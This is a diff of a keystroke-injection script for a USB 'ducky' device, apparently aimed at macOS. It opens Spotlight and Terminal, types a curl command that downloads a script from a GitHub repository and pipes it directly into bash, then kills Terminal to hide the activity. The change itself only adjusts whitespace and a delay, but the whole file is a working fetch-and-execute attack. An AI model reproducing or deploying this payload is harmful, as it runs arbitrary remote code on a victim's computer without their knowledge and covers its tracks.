@@ -3,8 +3,7 @@ COMMAND SPACE
 STRING terminal
 ENTER
 DELAY 1000
-DELAY 10
-STRING curl  -H "Cache-Control: no-cache, no-store" -s "https://raw.githubusercontent.com/kroneman/ducky-usb-fun/master/devices/waveshare_rp2040_payload_1?${RANDOM}" | bash
+STRING curl -H "Cache-Control: no-cache, no-store" -s "https://raw.githubusercontent.com/kroneman/ducky-usb-fun/master/devices/waveshare_rp2040_payload_1?${RANDOM}" | bash
 ENTER
 DELAY 1000
 STRING killall Terminal
